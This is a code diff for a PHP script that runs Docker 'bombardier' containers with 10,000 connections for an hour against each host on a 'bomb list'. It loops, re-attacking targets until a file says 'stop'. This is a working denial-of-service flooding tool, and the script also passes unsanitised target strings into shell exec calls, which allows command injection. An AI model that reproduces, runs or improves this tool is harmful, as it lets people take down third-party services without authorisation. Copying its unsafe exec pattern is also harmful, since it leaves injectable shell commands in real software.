@@ -1,5 +1,5 @@
 <?php
-
+require_once 'helpers.php';
 function action($argv)
 {
     $memavaible = (integer)getSystemMemInfo()['MemAvailable'];
@@ -9,29 +9,38 @@ function action($argv)
     $i = 0;
 
     $bomb_list = getBombList($argv);
-    var_dump($bomb_list);
     if (!empty($bomb_list)){
         while ($rule) {
 
             foreach ($bomb_list as $key => $bomb_item) {
-                if($memavaible > 1000000 && !in_array($bomb_item, $is_bombed)){
-                    echo shell_exec("docker run -ti --rm -d alpine/bombardier -c 10000 -d 3600s -l ".$bomb_item);
+                $found_result = exec('docker ps --no-trunc | grep -i '.$bomb_item);
+                $is_dockerized = (bool)(strpos($found_result, $bomb_item));
+
+                if(($memavaible/1000) > 1000
+                    && !in_array($bomb_item, $is_bombed)
+                    && !$is_dockerized
+                ){
+                    exec("docker run -ti --rm -d alpine/bombardier -c 10000 -d 3600s -l ".$bomb_item);
                     $is_bombed[] = $bomb_item;
                 }
 
-                $count_of_argv = count($argv);
+
                 $count_of_bombed = count($is_bombed);
 
-                if(($count_of_argv - $count_of_bombed) == 1){
-                    $rule = false;
-                }
-
-                if(!isset($bomb_list[$key + 1])){
-                    $rule = false;
+                if((count($bomb_list) - $count_of_bombed) == 0){
+                    $is_bombed = [];
                 }
             }
 
+
+            $i++;
             var_dump('iteration - '.$i.' - '.date('Y-m-d h:i:s'));
+
+            $rule_text = file_get_contents('rule');
+            if ($rule_text == 'stop'){
+                $rule = false;
+            }
+            var_dump($rule_text);
         }
     }
 
